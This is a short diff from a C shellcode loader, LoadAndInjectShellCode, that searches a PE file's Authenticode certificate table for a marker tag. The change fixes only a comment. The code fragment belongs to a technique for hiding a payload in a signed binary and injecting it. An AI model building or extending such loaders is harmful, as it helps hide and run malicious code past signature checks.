@@ -94,7 +94,7 @@ BOOL LoadAndInjectShellCode()
 	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
 	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);
 
-	//Linear search for 0xfeedface0xfeedface tag, , , 
+	//Linear search for 0xcadafcae tag 
 	_pePtr = ((BYTE*)_peBlob + _CertTableRVA);
 	for (_index = 0; _index < _CertTableSize; _index++) {
 		if (*(_pePtr + _index) == 0xca && *(_pePtr + _index + 1) == 0xda && *(_pePtr + _index + 2) == 0xfc && *(_pePtr + _index + 3) == 0xae) {
